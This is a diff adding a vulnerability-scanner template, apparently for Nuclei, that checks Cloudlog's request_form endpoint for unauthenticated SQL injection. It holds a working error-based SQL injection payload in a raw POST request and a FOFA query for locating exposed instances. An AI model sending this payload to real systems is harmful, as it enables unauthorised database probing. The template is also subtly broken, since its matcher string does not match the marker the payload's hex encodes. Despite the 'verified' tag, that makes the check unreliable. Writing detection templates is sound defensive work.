@@ -1,0 +1,32 @@
+id: cloudlog-request-form-sqli
+
+info:
+  name: Cloudlog SQL Injection
+  author: qwtd
+  severity: critical
+  description: The Cloudlog system interface request_form is vulnerable to unauthorized SQL injection, which can be exploited by unauthenticated remote attackers to obtain information from the database.
+  reference:
+    - https://github.com/wy876/POC/blob/main/Cloudlog/Cloudlog%E7%B3%BB%E7%BB%9Frequest_form%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: "Login - Cloudlog"
+  tags: cloudlog
+
+http:
+  - raw:
+      - |
+        POST /index.php/oqrs/request_form HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,(SELECT (ELT(2469=2469,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    matchers:
+      - type: word
+        words:
+          - "A Database Error Occurred"
+          - "qbgkq1qbqkg1"
+        condition: and
